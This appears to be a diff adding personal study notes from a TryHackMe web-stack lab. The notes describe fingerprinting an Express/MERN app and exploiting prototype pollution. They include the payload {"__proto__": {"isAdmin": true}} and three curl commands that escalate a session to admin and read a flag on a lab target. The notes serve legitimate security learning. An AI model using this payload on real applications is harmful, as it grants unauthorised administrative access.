@@ -54,3 +54,24 @@ Payment Card Industry Data Security Standard
 
 # Modern Web Stacks
 [LINK](https://tryhackme.com/room/modernwebstacks)
+
+
+### MERN Stack
+
+- **`X-Powered-By: Express`** header (main signal)
+- **`connect.sid`** cookie (express-session)
+- **Plain text error:** `Cannot GET /nonexistent`
+
+#### The Vulnerability: Prototype Pollution
+- Unsafe recursive `merge` function that doesn’t filter `__proto__` or `constructor.prototype`.
+- Payload: `{"__proto__": {"isAdmin": true}}`
+
+#### Exploitation Steps
+1. **Save session cookie** → `curl -c cookies.txt http://target:3000/`
+2. **Pollute prototype** →  
+   `curl -b cookies.txt -X POST http://target:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'`
+3. **Access protected admin endpoint** →  
+   `curl -b cookies.txt http://target:3000/api/admin/flag`
+
+
+
